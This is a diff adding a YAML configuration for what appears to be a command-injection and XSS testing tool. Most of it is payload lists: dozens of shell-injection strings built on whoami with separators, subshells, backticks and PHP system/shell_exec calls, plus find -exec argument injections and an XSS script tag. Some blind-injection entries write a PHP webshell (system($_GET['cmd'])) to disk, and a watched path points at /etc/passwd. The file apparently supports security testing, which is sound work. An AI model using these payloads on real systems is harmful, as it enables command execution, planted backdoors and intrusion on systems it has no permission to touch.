@@ -1,2 +1,114 @@
 user_name: "szymon_ubuntu"
 folder_to_watch: "/etc/passwd"
+query_params: ["host", "user", "input", "name" ]
+command_injection:
+  ping:
+    query_param: "host"
+    attack_01: r"localhost; whoami"
+    attack_02: r"localhost;whoami"
+    attack_03: r"localhost&whoami;"
+    attack_04: r"localhost&whoami"
+    attack_05: r"localhost&&whoami;"
+    attack_06: r"localhost&&whoami"
+    attack_07: r"localhost|whoami;"
+    attack_08: r"localhost|whoami"
+    attack_09: r"localhost||whoami;"
+    attack_10: r"localhost||whoami"
+    attack_11: r"localhost0x0awhoami;"
+    attack_12: r"localhost0x0awhoami"
+    attack_13: r"localhost;$(whoami);"
+    attack_14: r"localhost;$(whoami)"
+    attack_15: r"localhost`whoami`;"
+    attack_16: r"localhost`whoami`"
+    attack_17: r"localhost<(whoami);"
+    attack_18: r"localhost<(whoami)"
+    attack_19: r"localhost<<EOF\nwhoami\nEOF;"
+    attack_20: r"localhost<<EOF\nwhoami\nEOF"
+    attack_21: r"localhost<<<whoami;"
+    attack_22: r"localhost<<<whoami"
+    attack_23: r'localhost"$(whoami)";'
+    attack_24: r'localhost"$(whoami)"'
+    attack_25: r"localhost'$(whoami)';"
+    attack_26: r"localhost'$(whoami)'"
+    attack_27: r"localhost\$(whoami);"
+    attack_28: r"localhost\$(whoami)"
+    attack_29: r"\$localhost{whoami};"
+    attack_30: r"\$localhost{whoami}"
+    attack_31: r'\"system("whoami");'
+    attack_32: r'\'system("whoami");\''
+    attack_33: r'\"system("whoami");\"'
+    attack_34: r'\"shell_exec("whoami");'
+    attack_35: r'\'shell_exec("whoami");\''
+    attack_36: r'\"shell_exec("whoami");\"'
+    attack_37: r'\"${system("whoami")};\"'
+    attack_38: r'\"${system("whoami")};\"'
+    attack_39: r'\"${system("whoami")};\"'
+    attack_40: r'localhost; echo "<?php system(\$_GET['cmd']);" > webshell.php'
+  echo:
+    query_param: "name"
+    attack_01: r"$(whoami)"
+    attack_02: r"$(whoami);"
+arguments_injection:
+  find:
+    query_param: "input"
+    # Add name of the route e.g. find-escapeshellcmd.php in value so the find always works
+    semicolon: r" -exec whoami ;"
+    escape_semicolon: r" -exec whoami \;"
+    d_escape_semicolon: r" -exec whoami \\;"
+    d_semicolon: r" -exec whoami \\"
+blind_command_injection:
+  find:
+    webshell_01: r" -exec echo '<?php system(\$_GET['cmd']);' > 01_webshell.php ;"
+    webshell_02: r" localhost; echo '<?php system(\$_GET['cmd']);' > 02_webshell.php ;"
+    webshell_03: r" localhost & echo '<?php system(\$_GET['cmd']);' > 03_webshell.php ;"
+    webshell_04: r" localhost && echo '<?php system(\$_GET['cmd']);' > 04_webshell.php ;"
+    webshell_05: r" localhost | echo '<?php system(\$_GET['cmd']);' > 05_webshell.php ;"
+    webshell_06: r" localhost || echo '<?php system(\$_GET['cmd']);' > 06_webshell.php ;"
+    webshell_07: r" localhost0x0a echo '<?php system(\$_GET['cmd']);' > 07_webshell.php ;"
+    webshell_08: r" localhost;$(echo '<?php system(\$_GET['cmd']);' > 08_webshell.php) ;"
+    webshell_09: r" localhost;`echo '<?php system(\$_GET['cmd']);' > 09_webshell.php` ;"
+    webshell_10: r" localhost;echo '<?php system(\$_GET['cmd']);' > 10_webshell.php ;"
+xss:
+  query_param: ["name", "input", "host"]
+  create_xss_text: '<script> document.body.appendChild(document.createTextNode("{{WHOAMI_ORACLE}}"));</script>'
+  # semicolon : r";whoami",
+  # semicolon ping : r"localhost;whoami",
+  # ampersand : r"&whoami",
+  # ampersand ping : r"localhost&whoami",
+  # logical AND : r"&&whoami",
+  # logical AND ping : r"localhost&&whoami",
+  # pipe : r"|whoami",
+  # pipe ping : r"localhost|whoami",
+  # logical OR : r"||whoami",
+  # logical OR ping : r"localhost||whoami",
+  # newline : r"0x0awhoami",
+  # newline ping : r"localhost0x0awhoami",
+  # subshell : r"$(whoami)",
+  # subshell ping : r"localhost;$(whoami)",
+  # command substitution : r"`whoami`",
+  # command substitution ping : r"localhost`whoami`",
+  # process substitution : r"<(whoami)",
+  # process substitution ping : r"localhost<(whoami)",
+  # here document : r"<<EOF\nwhoami\nEOF",
+  # here document ping : r"localhost<<EOF\nwhoami\nEOF",
+  # here string : r"<<<whoami",
+  # here string ping : r"localhost<<<whoami",
+  # double quotes : r'"$(whoami)"',
+  # double quotes ping : r'localhost"$(whoami)"',
+  # single quotes : r"'$(whoami)'",
+  # single quotes ping : r"localhost'$(whoami)'",
+  # backslash : r"\$(whoami)",
+  # backslash ping : r"localhost\$(whoami)",
+  # backticks : r"\`whoami\`",
+  # backticks ping : r"localhost\`whoami\`",
+  # dollar sign : r"\$whoami",
+  # dollar sign ping : r"localhost\$whoami",
+  # braces : r"\${whoami}",
+  # braces ping : r"\$localhost{whoami}",
+  # quote system injection 1": r'\"system("whoami");',
+  # quote system injection 2": r'\'system("whoami");\'',
+  # quote system injection 3: r'\"system("whoami");\"',
+  # quote shell_exec injection 1": r'\"shell_exec("whoami");',
+  # quote shell_exec injection 2": r'\'shell_exec("whoami");\'',
+  # quote shell_exec injection 3: r'\"shell_exec("whoami");\"',
+  # quote php code injection": r'\"${system("whoami")};\"',
